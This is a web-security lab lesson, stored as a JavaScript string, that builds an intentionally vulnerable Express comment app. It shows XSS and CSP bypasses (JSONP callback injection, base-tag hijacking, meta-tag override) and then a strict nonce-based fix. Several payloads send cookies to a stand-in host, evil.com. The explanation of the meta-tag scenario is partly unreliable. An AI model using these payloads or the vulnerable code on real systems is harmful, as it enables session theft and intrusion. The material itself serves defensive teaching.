window.LESSONS = window.LESSONS || {};
window.LESSONS.csp = `

<h1 class="lesson-title">Lab 14: Content Security Policy</h1>

<p class="lesson-subtitle">
  Content Security Policy is the last line of defense between an XSS vulnerability and actual damage. Even when
  an attacker finds an injection point, a properly configured CSP can prevent their payload from executing. In
  this lab, you will build a vulnerable application, watch XSS succeed without CSP, then systematically explore
  four real-world bypass scenarios that expose common misconfigurations. By the end, you will know how to deploy
  a strict nonce-based policy that actually holds up under attack.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> What CSP Is and Why It Exists</h2>

<p>
  Let me be direct about something: CSP does not fix XSS. It mitigates the impact of XSS. If your application
  has a cross-site scripting vulnerability, you need to fix the vulnerability. CSP is defense-in-depth. It is the
  seatbelt, not the brakes. But just like seatbelts, it saves lives when everything else fails, and deploying
  without it is negligent in 2025.
</p>

<p>
  CSP works by telling the browser exactly what resources are allowed to load and execute on a page. You deliver
  it as an HTTP response header, and the browser enforces it strictly. If a script tries to run and it does not
  match the policy, the browser blocks it. No exceptions. No fallback. Blocked.
</p>

<p>
  Here are the core directives you need to understand:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">CSP Directive Reference</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// default-src: Fallback for all resource types not explicitly listed.</span>
<span class="cmt">// If you only set default-src, it applies to scripts, styles, images, etc.</span>
default-src 'self';

<span class="cmt">// script-src: Controls which scripts can execute.</span>
<span class="cmt">// This is the most critical directive for XSS defense.</span>
script-src 'self' 'nonce-abc123';

<span class="cmt">// style-src: Controls which stylesheets can load.</span>
style-src 'self' 'unsafe-inline';

<span class="cmt">// img-src: Controls which images can load.</span>
img-src 'self' data: https://cdn.example.com;

<span class="cmt">// connect-src: Controls fetch, XHR, WebSocket destinations.</span>
connect-src 'self' https://api.example.com;

<span class="cmt">// base-uri: Restricts what URLs can appear in &lt;base&gt; tags.</span>
<span class="cmt">// Critical for preventing base tag hijacking (we will cover this).</span>
base-uri 'self';

<span class="cmt">// form-action: Restricts where forms can submit data.</span>
form-action 'self';

<span class="cmt">// frame-ancestors: Controls who can embed your page in iframes.</span>
<span class="cmt">// Replaces X-Frame-Options.</span>
frame-ancestors 'none';

<span class="cmt">// object-src: Controls Flash, Java applets, etc. Always set to 'none'.</span>
object-src 'none';
  </pre>
</div>

<p>
  A few things to internalize. First, <code>default-src</code> is your safety net. Any directive you do not
  explicitly set falls back to <code>default-src</code>. If you set <code>default-src 'none'</code> and then
  only whitelist specific directives, you start from a deny-all posture. That is the right approach. Second,
  <code>script-src</code> is where most of the action happens. XSS is about executing JavaScript, so controlling
  script execution is the primary goal. Third, every directive you omit is a potential hole.
</p>

<div class="callout warn">
  <div class="callout-title">The default-src Trap</div>
  <div class="callout-text">
    A common mistake is setting <code>script-src</code> but forgetting <code>default-src</code>. If you set
    <code>script-src 'self'</code> but do not set <code>default-src</code>, then every other resource type
    (images, styles, fonts, connections) has no restriction at all. Always start with
    <code>default-src 'none'</code> or <code>default-src 'self'</code> and then explicitly open what you need.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Build the Vulnerable App &mdash; No CSP</h2>

<p>
  We are going to build a simple comment system with a stored XSS vulnerability. No CSP header at all. This is
  our baseline. You need to see what happens when there is zero protection so you understand what CSP is
  supposed to prevent.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> express = <span class="fn">require</span>(<span class="str">'express'</span>);
<span class="kw">const</span> app = <span class="fn">express</span>();

app.<span class="fn">use</span>(express.<span class="fn">urlencoded</span>({ extended: <span class="kw">true</span> }));
app.<span class="fn">use</span>(express.<span class="fn">json</span>());

<span class="cmt">// In-memory comment store (simulates a database)</span>
<span class="kw">let</span> comments = [];

<span class="cmt">// Serve the comment page</span>
app.<span class="fn">get</span>(<span class="str">'/'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> commentHtml = comments
    .<span class="fn">map</span>(c <span class="op">=></span> \`&lt;div class="comment"&gt;
      &lt;strong&gt;\${c.author}&lt;/strong&gt;: \${c.text}
    &lt;/div&gt;\`)
    .<span class="fn">join</span>(<span class="str">''</span>);

  res.<span class="fn">send</span>(\`
    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;&lt;title&gt;Comments&lt;/title&gt;&lt;/head&gt;
    &lt;body&gt;
      &lt;h1&gt;Community Comments&lt;/h1&gt;
      &lt;form action="/comment" method="POST"&gt;
        &lt;input name="author" placeholder="Your name"&gt;
        &lt;textarea name="text" placeholder="Your comment"&gt;&lt;/textarea&gt;
        &lt;button type="submit"&gt;Post&lt;/button&gt;
      &lt;/form&gt;
      &lt;div id="comments"&gt;\${commentHtml}&lt;/div&gt;
    &lt;/body&gt;
    &lt;/html&gt;
  \`);
});

<span class="cmt">// Store comment WITHOUT sanitization (vulnerable)</span>
app.<span class="fn">post</span>(<span class="str">'/comment'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> { author, text } = req.body;
  comments.<span class="fn">push</span>({ author, text }); <span class="cmt">// Raw user input stored directly</span>
  res.<span class="fn">redirect</span>(<span class="str">'/'</span>);
});

app.<span class="fn">listen</span>(<span class="num">3000</span>, () <span class="op">=></span> {
  console.<span class="fn">log</span>(<span class="str">'Server running on http://localhost:3000'</span>);
});
  </pre>
</div>

<p>
  Notice the problem: the <code>text</code> field from the comment form is inserted directly into the HTML with
  no escaping and no sanitization. Whatever the user types gets rendered as raw HTML. This is textbook stored XSS.
</p>

<p>
  Now submit this as a comment:
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Cookie-Stealing Payload (No CSP)</div>
  <pre>
<span class="cmt">&lt;!-- Post this as the comment text --&gt;</span>
&lt;script&gt;
  new Image().src = 'https://evil.com/steal?cookie=' +
    encodeURIComponent(document.cookie);
&lt;/script&gt;
  </pre>
</div>

<p>
  Every user who visits the page now has their cookies sent to the attacker's server. The script tag is parsed by
  the browser as legitimate HTML, it executes immediately, and the <code>Image</code> trick fires a GET request
  that the browser happily sends, complete with the stolen cookie as a query parameter. There is no CSP header,
  so the browser has zero reason to block this.
</p>

<div class="callout info">
  <div class="callout-title">Why Image Beacons?</div>
  <div class="callout-text">
    Attackers use <code>new Image().src</code> instead of <code>fetch()</code> because image loads are not
    blocked by CORS. The browser does not wait for a response or care about the response headers. It just sends
    the request, including the cookie data in the URL. It is the simplest exfiltration technique, and it has
    worked for over two decades.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> Scenario 1 &mdash; unsafe-inline Makes CSP Useless</h2>

<p>
  This is the most common CSP mistake I see in production. The developer knows they should have a CSP, so they
  add one. But their application uses inline scripts -- maybe an analytics snippet, maybe an inline event handler,
  maybe a configuration object embedded in the page. Instead of refactoring, they add <code>'unsafe-inline'</code>
  to their script-src directive and call it done.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js &mdash; Adding a Weak CSP</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// This CSP is effectively useless against XSS</span>
app.<span class="fn">use</span>((<span class="fn">req</span>, <span class="fn">res</span>, <span class="fn">next</span>) <span class="op">=></span> {
  res.<span class="fn">setHeader</span>(
    <span class="str">'Content-Security-Policy'</span>,
    <span class="str">"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"</span>
  );
  <span class="fn">next</span>();
});
  </pre>
</div>

<p>
  Now try the exact same XSS payload from Step 2 -- the cookie-stealing script. Go ahead, submit it as a comment.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Same Payload, Still Works</div>
  <pre>
&lt;script&gt;
  new Image().src = 'https://evil.com/steal?cookie=' +
    encodeURIComponent(document.cookie);
&lt;/script&gt;
  </pre>
</div>

<p>
  It executes. The CSP header is there, the browser parsed it, and it did absolutely nothing to stop the attack.
  Why? Because <code>'unsafe-inline'</code> in <code>script-src</code> tells the browser to allow any inline
  script. That is exactly what XSS injects. You have deployed a CSP that explicitly permits the thing you are
  trying to prevent.
</p>

<p>
  I cannot stress this enough: if your CSP includes <code>script-src 'unsafe-inline'</code>, you do not have
  meaningful XSS protection from CSP. You have a header that makes your security scan look green, and that is it.
  It is security theater. I have seen this in production at companies that should know better. Their security
  team required CSP, so the developers added one that technically exists but protects nothing.
</p>

<div class="callout warn">
  <div class="callout-title">How Common Is This?</div>
  <div class="callout-text">
    An analysis of the top 1 million websites found that over 90% of CSP deployments that include
    <code>script-src</code> also include <code>'unsafe-inline'</code>. The vast majority of deployed CSPs
    provide no meaningful protection against XSS. Do not be part of that statistic.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> Scenario 2 &mdash; JSONP Endpoint Bypass</h2>

<p>
  Now let us look at a more sophisticated scenario. The developer got the message: no <code>'unsafe-inline'</code>.
  They deploy a strict policy. But the application has a JSONP endpoint, and that one detail makes the entire
  CSP bypassable.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js &mdash; Strict CSP + JSONP Endpoint</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// CSP looks strict -- no unsafe-inline!</span>
app.<span class="fn">use</span>((<span class="fn">req</span>, <span class="fn">res</span>, <span class="fn">next</span>) <span class="op">=></span> {
  res.<span class="fn">setHeader</span>(
    <span class="str">'Content-Security-Policy'</span>,
    <span class="str">"default-src 'self'; script-src 'self'; style-src 'self'"</span>
  );
  <span class="fn">next</span>();
});

<span class="cmt">// JSONP endpoint for legacy API compatibility</span>
app.<span class="fn">get</span>(<span class="str">'/api/data'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> callback = req.query.callback || <span class="str">'handleData'</span>;
  <span class="kw">const</span> data = { users: <span class="num">42</span>, active: <span class="num">17</span> };
  <span class="cmt">// Wraps the response in the callback function name</span>
  res.<span class="fn">type</span>(<span class="str">'application/javascript'</span>);
  res.<span class="fn">send</span>(\`\${callback}(\${<span class="fn">JSON</span>.<span class="fn">stringify</span>(data)})\`);
});
  </pre>
</div>

<p>
  The CSP says <code>script-src 'self'</code>. That means scripts can only load from the application's own
  origin. No inline scripts, no external domains. Sounds solid, right? But the JSONP endpoint accepts a
  <code>callback</code> parameter and wraps the response in whatever function name you provide. The response
  has a JavaScript content type. And it is served from <code>'self'</code>.
</p>

<p>
  The attacker can control the "function name" and inject arbitrary JavaScript as the callback parameter.
  Because the response comes from the same origin, CSP allows it.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: JSONP Callback Injection</div>
  <pre>
<span class="cmt">&lt;!-- Injected via stored XSS (the comment field) --&gt;</span>
&lt;script src="/api/data?callback=document.location='https://evil.com/?c='%2Bdocument.cookie//"&gt;&lt;/script&gt;
  </pre>
</div>

<p>
  Let us trace what happens step by step:
</p>

<p>
  1. The browser sees a <code>&lt;script&gt;</code> tag with a <code>src</code> pointing to <code>/api/data</code>.
  The source is the same origin, so CSP allows it.
</p>

<p>
  2. The server receives the request with the callback parameter set to
  <code>document.location='https://evil.com/?c='+document.cookie//</code>.
</p>

<p>
  3. The server responds with:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Server Response (application/javascript)</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
document.location='https://evil.com/?c='+document.cookie//({"users":42,"active":17})
  </pre>
</div>

<p>
  4. The browser executes this as JavaScript. The <code>//</code> at the end turns the JSON data into a comment.
  The user's cookies get sent to <code>evil.com</code>. CSP did not fire a single violation because every rule
  was technically satisfied.
</p>

<div class="fix-box">
  <div class="fix-title">Fix: Eliminate JSONP</div>
  <p>
    JSONP is a relic from before CORS existed. It should not be in any modern application. Replace JSONP endpoints
    with standard JSON APIs and configure proper CORS headers. If you absolutely must support legacy clients that
    require JSONP, validate the callback parameter against a strict allowlist of function names:
  </p>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Safe JSONP (if you must)</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
app.<span class="fn">get</span>(<span class="str">'/api/data'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> callback = req.query.callback;
  <span class="kw">const</span> data = { users: <span class="num">42</span>, active: <span class="num">17</span> };

  <span class="kw">if</span> (callback) {
    <span class="cmt">// Only allow simple alphanumeric function names</span>
    <span class="kw">if</span> (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(callback)) {
      <span class="kw">return</span> res.<span class="fn">status</span>(<span class="num">400</span>).<span class="fn">json</span>({ error: <span class="str">'Invalid callback name'</span> });
    }
    res.<span class="fn">type</span>(<span class="str">'application/javascript'</span>);
    res.<span class="fn">send</span>(\`\${callback}(\${<span class="fn">JSON</span>.<span class="fn">stringify</span>(data)})\`);
  } <span class="kw">else</span> {
    res.<span class="fn">json</span>(data);
  }
});
    </pre>
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> Scenario 3 &mdash; base-uri Hijacking</h2>

<p>
  This bypass is elegant and devastating. The developer has done almost everything right. They are using
  nonce-based CSP. No <code>'unsafe-inline'</code>. No JSONP endpoints. Scripts only execute if they have the
  correct nonce. But they forgot one directive: <code>base-uri</code>.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js &mdash; Nonce-Based CSP (Missing base-uri)</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);

app.<span class="fn">use</span>((<span class="fn">req</span>, <span class="fn">res</span>, <span class="fn">next</span>) <span class="op">=></span> {
  <span class="cmt">// Generate a random nonce for each request</span>
  <span class="kw">const</span> nonce = crypto.<span class="fn">randomBytes</span>(<span class="num">16</span>).<span class="fn">toString</span>(<span class="str">'base64'</span>);
  res.locals.nonce = nonce;

  res.<span class="fn">setHeader</span>(
    <span class="str">'Content-Security-Policy'</span>,
    \`default-src 'self'; script-src 'nonce-\${nonce}'; style-src 'self'\`
    <span class="cmt">// Notice: no base-uri directive!</span>
  );
  <span class="fn">next</span>();
});

<span class="cmt">// The page uses relative script paths</span>
app.<span class="fn">get</span>(<span class="str">'/'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> { nonce } = res.locals;
  res.<span class="fn">send</span>(\`
    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;&lt;title&gt;App&lt;/title&gt;&lt;/head&gt;
    &lt;body&gt;
      &lt;div id="comments"&gt;\${renderComments()}&lt;/div&gt;
      &lt;script nonce="\${nonce}" src="/js/app.js"&gt;&lt;/script&gt;
      &lt;script nonce="\${nonce}" src="/js/analytics.js"&gt;&lt;/script&gt;
    &lt;/body&gt;
    &lt;/html&gt;
  \`);
});
  </pre>
</div>

<p>
  The scripts have the correct nonce, and they use relative paths: <code>/js/app.js</code> and
  <code>/js/analytics.js</code>. Under normal circumstances, relative paths resolve against the page's origin.
  But the HTML <code>&lt;base&gt;</code> tag changes where relative URLs resolve to. If an attacker can inject
  a <code>&lt;base&gt;</code> tag before those script tags, they can redirect all relative script loads to their
  own server.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Base Tag Hijacking</div>
  <pre>
<span class="cmt">&lt;!-- Injected via stored XSS in the comments section --&gt;</span>
<span class="cmt">&lt;!-- This appears BEFORE the script tags in the DOM --&gt;</span>
&lt;base href="https://evil.com/"&gt;
  </pre>
</div>

<p>
  That is the entire payload. One tag, no JavaScript, no script execution. Here is what happens:
</p>

<p>
  1. The browser parses the page and encounters <code>&lt;base href="https://evil.com/"&gt;</code>. This is
  not a script, so <code>script-src</code> does not apply. There is no <code>base-uri</code> directive, so
  CSP has nothing to say about it.
</p>

<p>
  2. When the browser reaches <code>&lt;script nonce="abc123" src="/js/app.js"&gt;</code>, it resolves the
  relative path against the base URL. Instead of loading <code>https://yourapp.com/js/app.js</code>, it loads
  <code>https://evil.com/js/app.js</code>.
</p>

<p>
  3. Wait, would CSP not block this because evil.com is not in <code>script-src</code>? Here is the subtle
  part: the nonce is present on the script tag. When a script tag has a valid nonce, many browsers allow it
  regardless of the source URL. The nonce acts as the trust signal, not the origin of the file.
</p>

<p>
  4. The attacker hosts their own <code>/js/app.js</code> at <code>evil.com</code> with whatever payload they
  want. Full JavaScript execution in the context of your application.
</p>

<div class="callout warn">
  <div class="callout-title">The Nonce + Base Tag Interaction</div>
  <div class="callout-text">
    The behavior around nonces and base tags varies across browsers and CSP specification levels. In CSP Level 2,
    a valid nonce generally allows the script regardless of source. CSP Level 3 with <code>strict-dynamic</code>
    changes this behavior. But you should never rely on browser-specific behavior for security. The correct fix is
    to always include <code>base-uri 'self'</code> or <code>base-uri 'none'</code> in your policy.
  </div>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Always Set base-uri</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Fixed CSP Header</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
res.<span class="fn">setHeader</span>(
  <span class="str">'Content-Security-Policy'</span>,
  \`default-src 'self'; script-src 'nonce-\${nonce}'; style-src 'self'; base-uri 'self'\`
);
    </pre>
  </div>
  <p>
    With <code>base-uri 'self'</code>, the browser will refuse to apply any <code>&lt;base&gt;</code> tag
    that points to an external origin. The injected tag is ignored, and relative paths continue to resolve
    against your own domain.
  </p>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 6</span> Scenario 4 &mdash; CSP via Meta Tag Injection</h2>

<p>
  Some developers set CSP via a <code>&lt;meta&gt;</code> tag in the HTML instead of an HTTP response header.
  This works, technically. The browser reads the meta tag and enforces the policy. But it introduces a critical
  vulnerability: if the attacker can inject HTML before the meta tag, they can inject their own CSP meta tag
  with a completely permissive policy.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js &mdash; CSP via Meta Tag</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
app.<span class="fn">get</span>(<span class="str">'/'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  res.<span class="fn">send</span>(\`
    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;
      &lt;title&gt;App&lt;/title&gt;
      &lt;!-- CSP set via meta tag instead of HTTP header --&gt;
      &lt;meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'self'"&gt;
    &lt;/head&gt;
    &lt;body&gt;
      &lt;h1&gt;Community Comments&lt;/h1&gt;
      &lt;div id="comments"&gt;\${renderComments()}&lt;/div&gt;
    &lt;/body&gt;
    &lt;/html&gt;
  \`);
});
  </pre>
</div>

<p>
  The problem is that the comment injection point is in the <code>&lt;body&gt;</code>, and the CSP meta tag is
  in the <code>&lt;head&gt;</code>. Normally the meta tag would be parsed first. But what if the attacker can
  inject content that appears earlier in the document? Some applications have injection points in the
  <code>&lt;head&gt;</code> section -- for example, a user-controlled page title, a canonical URL, or a
  meta description pulled from user input.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Vulnerable Page with Head Injection</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
app.<span class="fn">get</span>(<span class="str">'/page/:title'</span>, (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> {
  <span class="cmt">// User-controlled title injected into &lt;head&gt;</span>
  res.<span class="fn">send</span>(\`
    &lt;!DOCTYPE html&gt;
    &lt;html&gt;
    &lt;head&gt;
      &lt;title&gt;\${req.params.title}&lt;/title&gt;
      &lt;meta http-equiv="Content-Security-Policy"
        content="default-src 'self'; script-src 'self'"&gt;
    &lt;/head&gt;
    &lt;body&gt;
      &lt;h1&gt;\${req.params.title}&lt;/h1&gt;
      &lt;p&gt;Page content here.&lt;/p&gt;
    &lt;/body&gt;
    &lt;/html&gt;
  \`);
});
  </pre>
</div>

<div class="attack-box">
  <div class="attack-title">Attack: CSP Meta Tag Override</div>
  <pre>
<span class="cmt">&lt;!-- Craft a URL with the title parameter containing: --&gt;</span>
/page/&lt;/title&gt;&lt;meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'"&gt;&lt;title&gt;

<span class="cmt">&lt;!-- The rendered HTML becomes: --&gt;</span>
&lt;head&gt;
  &lt;title&gt;&lt;/title&gt;
  &lt;meta http-equiv="Content-Security-Policy"
    content="default-src * 'unsafe-inline' 'unsafe-eval'"&gt;
  &lt;title&gt;&lt;/title&gt;
  &lt;meta http-equiv="Content-Security-Policy"
    content="default-src 'self'; script-src 'self'"&gt;
&lt;/head&gt;
  </pre>
</div>

<p>
  When the browser encounters two CSP meta tags, the behavior depends on the browser. In some implementations,
  the first policy parsed wins. In others, both policies are enforced and a request must satisfy both. However,
  the key insight is that an attacker-injected meta tag with <code>default-src *</code> combined with the
  legitimate tag creates unpredictable behavior, and in many real-world scenarios the permissive policy takes
  precedence for resources loaded before the strict tag is parsed.
</p>

<p>
  More importantly, even if both policies are enforced, the attacker's injected tag can include
  <code>'unsafe-inline'</code>, which the legitimate tag does not have. The intersection of two policies does
  not always produce the strictest result when inline execution is involved.
</p>

<div class="fix-box">
  <div class="fix-title">Fix: Always Use HTTP Headers for CSP</div>
  <p>
    CSP must be delivered as an HTTP response header, never as a meta tag in the HTML. HTTP headers are set by the
    server before the HTML body is sent. An attacker who can inject HTML cannot modify HTTP headers. This is
    a fundamental security boundary.
  </p>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Correct: CSP via HTTP Header</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
<span class="cmt">// Always set CSP as a response header, never as a meta tag</span>
app.<span class="fn">use</span>((<span class="fn">req</span>, <span class="fn">res</span>, <span class="fn">next</span>) <span class="op">=></span> {
  res.<span class="fn">setHeader</span>(
    <span class="str">'Content-Security-Policy'</span>,
    <span class="str">"default-src 'self'; script-src 'self'; style-src 'self'"</span>
  );
  <span class="fn">next</span>();
});
    </pre>
  </div>
</div>

<div class="callout info">
  <div class="callout-title">Meta Tag Limitations</div>
  <div class="callout-text">
    Even without the injection attack, CSP meta tags have limitations compared to HTTP headers. Meta tags cannot
    use <code>frame-ancestors</code>, <code>report-uri</code>, or <code>sandbox</code> directives. They also
    cannot use <code>report-to</code>. If you need any of these features -- and you should -- you must use the
    HTTP header. There is no good reason to deliver CSP via meta tag in a server-rendered application.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 7</span> Fix &mdash; Strict Nonce-Based CSP</h2>

<p>
  Now let us build the CSP that actually works. A strict nonce-based policy with <code>strict-dynamic</code>
  is the current best practice recommended by Google's security team and the CSP specification authors. Here
  is the complete implementation.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">middleware/csp.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);

<span class="kw">function</span> <span class="fn">cspMiddleware</span>(<span class="fn">req</span>, <span class="fn">res</span>, <span class="fn">next</span>) {
  <span class="cmt">// Generate a cryptographically random nonce for every request</span>
  <span class="kw">const</span> nonce = crypto.<span class="fn">randomBytes</span>(<span class="num">16</span>).<span class="fn">toString</span>(<span class="str">'base64'</span>);
  res.locals.cspNonce = nonce;

  <span class="kw">const</span> policy = [
    <span class="str">"default-src 'none'"</span>,               <span class="cmt">// Deny everything by default</span>
    \`script-src 'nonce-\${nonce}' 'strict-dynamic'\`, <span class="cmt">// Only nonced scripts</span>
    <span class="str">"style-src 'self'"</span>,                  <span class="cmt">// Styles from same origin only</span>
    <span class="str">"img-src 'self' data:"</span>,              <span class="cmt">// Images from self + data URIs</span>
    <span class="str">"font-src 'self'"</span>,                   <span class="cmt">// Fonts from same origin</span>
    <span class="str">"connect-src 'self'"</span>,                <span class="cmt">// XHR/Fetch to same origin</span>
    <span class="str">"base-uri 'self'"</span>,                   <span class="cmt">// Prevent base tag hijacking</span>
    <span class="str">"form-action 'self'"</span>,                <span class="cmt">// Forms submit to same origin only</span>
    <span class="str">"frame-ancestors 'none'"</span>,            <span class="cmt">// Cannot be embedded in iframes</span>
    <span class="str">"object-src 'none'"</span>,                 <span class="cmt">// No plugins (Flash, Java, etc.)</span>
    <span class="str">"require-trusted-types-for 'script'"</span> <span class="cmt">// Trusted Types enforcement</span>
  ].<span class="fn">join</span>(<span class="str">'; '</span>);

  res.<span class="fn">setHeader</span>(<span class="str">'Content-Security-Policy'</span>, policy);
  <span class="fn">next</span>();
}

module.exports = cspMiddleware;
  </pre>
</div>

<p>
  Every script tag in your HTML must include the nonce:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">views/layout.ejs</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Secure App&lt;/title&gt;
  &lt;link rel="stylesheet" href="/css/style.css"&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;%- body %&gt;

  <span class="cmt">&lt;!-- Every script tag must have the nonce --&gt;</span>
  &lt;script nonce="&lt;%= cspNonce %&gt;" src="/js/app.js"&gt;&lt;/script&gt;
  &lt;script nonce="&lt;%= cspNonce %&gt;" src="/js/analytics.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
  </pre>
</div>

<p>
  Let me explain why each part matters:
</p>

<p>
  <strong><code>default-src 'none'</code></strong> starts from a deny-all baseline. Nothing loads unless you
  explicitly allow it. This is the most secure starting point because any directive you forget to set is
  automatically blocked.
</p>

<p>
  <strong><code>script-src 'nonce-xxx' 'strict-dynamic'</code></strong> is the core of the policy. Only scripts
  with the correct nonce can execute. The <code>'strict-dynamic'</code> keyword is what makes this practical
  for real applications. When a nonced script loads, any scripts it dynamically creates (via
  <code>document.createElement('script')</code>) are also trusted. This means your bundler, your module loader,
  and your lazy-loaded chunks all work without needing individual nonces. But scripts injected via innerHTML
  or document.write are still blocked.
</p>

<p>
  <strong><code>base-uri 'self'</code></strong> prevents the base tag hijacking attack from Step 5.
</p>

<p>
  <strong><code>form-action 'self'</code></strong> prevents an attacker from injecting a form that submits
  data to an external server.
</p>

<p>
  <strong><code>object-src 'none'</code></strong> blocks plugin-based attacks. Always include this.
</p>

<p>
  Here is the same policy using Helmet.js, which is the standard CSP library for Express:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js &mdash; Helmet.js Configuration</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> helmet = <span class="fn">require</span>(<span class="str">'helmet'</span>);
<span class="kw">const</span> crypto = <span class="fn">require</span>(<span class="str">'crypto'</span>);

app.<span class="fn">use</span>((<span class="fn">req</span>, <span class="fn">res</span>, <span class="fn">next</span>) <span class="op">=></span> {
  res.locals.cspNonce = crypto.<span class="fn">randomBytes</span>(<span class="num">16</span>).<span class="fn">toString</span>(<span class="str">'base64'</span>);
  <span class="fn">next</span>();
});

app.<span class="fn">use</span>(
  <span class="fn">helmet</span>({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: [<span class="str">"'none'"</span>],
        scriptSrc: [
          (<span class="fn">req</span>, <span class="fn">res</span>) <span class="op">=></span> \`'nonce-\${res.locals.cspNonce}'\`,
          <span class="str">"'strict-dynamic'"</span>
        ],
        styleSrc: [<span class="str">"'self'"</span>],
        imgSrc: [<span class="str">"'self'"</span>, <span class="str">"data:"</span>],
        fontSrc: [<span class="str">"'self'"</span>],
        connectSrc: [<span class="str">"'self'"</span>],
        baseUri: [<span class="str">"'self'"</span>],
        formAction: [<span class="str">"'self'"</span>],
        frameAncestors: [<span class="str">"'none'"</span>],
        objectSrc: [<span class="str">"'none'"</span>]
      }
    }
  })
);
  </pre>
</div>

<div class="callout info">
  <div class="callout-title">Why strict-dynamic Matters</div>
  <div class="callout-text">
    Without <code>'strict-dynamic'</code>, you would need to add a nonce to every single script tag, including
    scripts that are dynamically created by your JavaScript at runtime. That is impractical with modern
    bundlers and code-splitting. <code>'strict-dynamic'</code> says: "Trust scripts loaded by already-trusted
    scripts." When a nonced script creates a new script element via <code>createElement</code>, that new script
    inherits trust. This is the mechanism that makes nonce-based CSP compatible with webpack, Vite, and
    other modern build tools.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> CSP Reporting</h2>

<p>
  A CSP that you never monitor is a CSP that will silently break or silently fail to protect you. CSP reporting
  lets the browser send you a notification every time a policy violation occurs. This is how you find out about
  attacks in progress, discover misconfigured pages, and identify legitimate resources that your policy is
  accidentally blocking.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">server.js &mdash; CSP Reporting Endpoint</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// Add report-uri to your CSP header</span>
<span class="kw">const</span> policy = [
  <span class="str">"default-src 'none'"</span>,
  \`script-src 'nonce-\${nonce}' 'strict-dynamic'\`,
  <span class="str">"style-src 'self'"</span>,
  <span class="str">"base-uri 'self'"</span>,
  <span class="str">"form-action 'self'"</span>,
  <span class="str">"object-src 'none'"</span>,
  <span class="str">"report-uri /csp-report"</span>,
  <span class="str">"report-to csp-endpoint"</span>
].<span class="fn">join</span>(<span class="str">'; '</span>);

res.<span class="fn">setHeader</span>(<span class="str">'Content-Security-Policy'</span>, policy);

<span class="cmt">// Also set the Report-To header for newer browsers</span>
res.<span class="fn">setHeader</span>(<span class="str">'Report-To'</span>, <span class="fn">JSON</span>.<span class="fn">stringify</span>({
  group: <span class="str">'csp-endpoint'</span>,
  max_age: <span class="num">10886400</span>,
  endpoints: [{ url: <span class="str">'/csp-report'</span> }]
}));

<span class="cmt">// Reporting endpoint</span>
